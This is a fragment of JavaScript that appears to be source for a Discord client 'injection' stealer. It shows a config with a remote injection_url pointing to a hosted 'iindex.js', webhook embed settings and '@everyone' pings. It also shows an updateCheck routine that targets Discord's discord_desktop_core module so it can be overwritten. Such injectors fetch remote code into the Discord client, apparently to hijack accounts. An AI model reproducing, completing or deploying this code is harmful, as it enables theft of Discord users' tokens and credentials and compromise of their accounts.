...
const config = {
  ...
  ping_val: '@everyone',
  embed_name: 'VOVOCHKA', 
  embed_icon: 'https://raw.githubusercontent.com/Glinomec1488/custom-inj/main/1.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Glinomec1488/custom-inj/main/iindex.js', 
  /**
...
function updateCheck() {
  ...
  const resourceIndex = path.join(appPath, 'iindex.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\iindex.js`;
